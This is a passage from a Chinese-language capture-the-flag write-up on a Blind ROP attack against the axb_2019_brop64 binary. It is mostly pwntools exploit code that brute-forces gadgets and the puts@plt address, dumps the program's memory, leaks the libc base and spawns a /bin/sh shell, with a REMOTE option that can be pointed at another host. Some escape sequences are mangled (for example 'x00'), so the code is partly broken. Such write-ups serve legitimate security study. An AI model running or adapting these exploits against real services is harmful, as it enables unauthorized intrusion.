                    return (old_return_addr+padding_length)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    #[+] We found a stop gadget is 0x4007d6
**寻找`BROP gadget`**
这里我们试图寻找到`__libc_csu_init`函数，根据之前提到的程序启动过程（见前置知识），`__libc_csu_init`函数会被`__libc_start_main`所调用，也就是说，程序中一定存在`__libc_csu_init`函数，而根据之前的`__libc_csu_init`函数的利用（见前置知识）,我们可以构造如下payload
    payload  = 'A' * padding_length 
    payload += p64(libc_csu_init_address) 
    payload += p64(0) * 6 
    payload += p64(stop_gadget) + p64(0) * 10
如果libc_csu_init_address是`pop rbx`处，程序将会再次回到stop_gadget。
那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)
    def Find_brop_gadget(libc_csu_init_address_maybe,padding_length,stop_gadget):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = process("./axb_2019_brop64")
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(libc_csu_init_address_maybe+maybe_low_byte) 
                payload += p64(0) * 6 
                payload += p64(stop_gadget) + p64(0) * 10
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success(
                        "We found a brop gadget is " + hex(
                            libc_csu_init_address_maybe+maybe_low_byte
                        )
                    )
                    return (libc_csu_init_address_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    #[+] We found a brop gadget is 0x40095A
**寻找puts[@plt](https://github.com/plt "@plt")**
接下来我们尝试找到puts的plt表地址，我们根据上面的泄露结果可以很明显的发现程序并没有开启ASLR保护，那么程序的加载地址必然位于0x400000，那么我们让puts输出0x400000处的内容，若地址正确，则输出结果必然包括‘ELF’。
那么我们可以写出爆破脚本(爆破范围是0x0000~0xFFFF)
    def Find_func_plt(func_plt_maybe,padding_length,stop_gadget,brop_gadget):
        maybe_low_byte=0x0600
        while True:
            try:
                sh = process("./axb_2019_brop64")
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(brop_gadget+9) # pop rdi;ret;
                payload += p64(0x400000)
                payload += p64(func_plt_maybe+maybe_low_byte)
                payload += p64(stop_gadget)
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "ELF" in sh.recvall(timeout=1):
                    log.success(
                        "We found a function plt address is " + hex(func_plt_maybe+maybe_low_byte)
                    )
                    return (func_plt_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    #[+] We found a function plt address is 0x400635
**利用puts[@plt](https://github.com/plt "@plt")，Dump源文件**
    def Dump_file(func_plt,padding_length,stop_gadget,brop_gadget):
        process_old_had_received_length=0
        process_now_had_received_length=0
        file_content=""
        while True:
            try:
                sh = process("./axb_2019_brop64")
                while True:
                    sh.recvuntil("Please tell me:")
                    payload  = 'A' * (padding_length - len('Begin_leak----->'))
                    payload += 'Begin_leak----->'
                    payload += p64(brop_gadget+9) # pop rdi;ret;
                    payload += p64(0x400000+process_now_had_received_length)
                    payload += p64(func_plt)
                    payload += p64(stop_gadget)
                    sh.send(payload)
                    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
                    received_data = sh.recvuntil('x0AHello')[:-6]
                    if len(received_data) == 0 :
                        file_content += 'x00'
                        process_now_had_received_length += 1
                    else :
                        file_content += received_data
                        process_now_had_received_length += len(received_data)
            except:
                if process_now_had_received_length == process_old_had_received_length :
                    log.info('We get ' + str(process_old_had_received_length) +' byte file!')
                    with open('axb_2019_brop64_dump','wb') as fout:
                        fout.write(file_content)
                    return
                process_old_had_received_length = process_now_had_received_length
                sh.close()
                pass
    #[*] We get 4096 byte file!
**IDA文件修复 &分析**
注意此处至多泄露0x1000个字节，也就是一个内存页。
我们把泄露的文件使用IDA进行分析。
我们刚刚已经泄露出了main函数的地址，我们对其进行函数的建立。
⚠：此时我们会发现我们之前认为的puts[@plt](https://github.com/plt
"@plt")，其实是错误的，正确的应该是0x400640。这是因为0x400650恰好是plt表头的原因。
**泄露puts的got表地址，Leak libc base**
    payload  = 'A' * (padding_length - len('Begin_leak----->'))
    payload += 'Begin_leak----->'
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(puts_got_addr)
    payload += p64(puts_plt_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
    puts_addr = u64(sh.recvuntil('x0AHello')[:-6].ljust(8,'x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    payload  = 'A' * padding_length
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recv()
    sh.interactive()
    sh.close()
**EXP**
    from pwn import *
    import binascii
    import sys
    context.log_level='debug'
    context.arch='amd64'
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def get_sh():
        if args['REMOTE']:
            return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./axb_2019_brop64")
    def Force_find_padding():
        padding_length=0
        while True:
            try:
                padding_length=padding_length+1
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                sh.send('A' * padding_length)
                if "Goodbye!" not in sh.recvall():
                    raise "Programe not exit normally!"
                sh.close()
            except:
                log.success("The true padding length is "+str(padding_length-1))
                return padding_length
        log.error("We don't find true padding length!")
    def Find_stop_gadget(old_return_addr,padding_length):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                sh.send('A' * padding_length + p16(maybe_low_byte))
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success("We found a stop gadget is " + hex(old_return_addr+maybe_low_byte))
                    return (old_return_addr+padding_length)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    def Find_brop_gadget(libc_csu_init_address_maybe,padding_length,stop_gadget):
        maybe_low_byte=0x0000
        while True:
            try:
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(libc_csu_init_address_maybe+maybe_low_byte) 
                payload += p64(0) * 6 
                payload += p64(stop_gadget) + p64(0) * 10
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "Hello" in sh.recvall(timeout=1):
                    log.success(
                        "We found a brop gadget is " + hex(
                            libc_csu_init_address_maybe+maybe_low_byte
                        )
                    )
                    return (libc_csu_init_address_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                sh.close()
    def Find_func_plt(func_plt_maybe,padding_length,stop_gadget,brop_gadget):
        maybe_low_byte=0x0600
        while True:
            try:
                sh = get_sh()
                sh.recvuntil("Please tell me:")
                payload  = 'A' * padding_length 
                payload += p64(brop_gadget+9) # pop rdi;ret;
                payload += p64(0x400000)
                payload += p64(func_plt_maybe+maybe_low_byte)
                payload += p64(stop_gadget)
                sh.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if "ELF" in sh.recvall(timeout=1):
                    log.success(
                        "We found a function plt address is " + hex(func_plt_maybe+maybe_low_byte)
                    )
                    return (func_plt_maybe+maybe_low_byte)
                maybe_low_byte=maybe_low_byte+1
            except:
                pass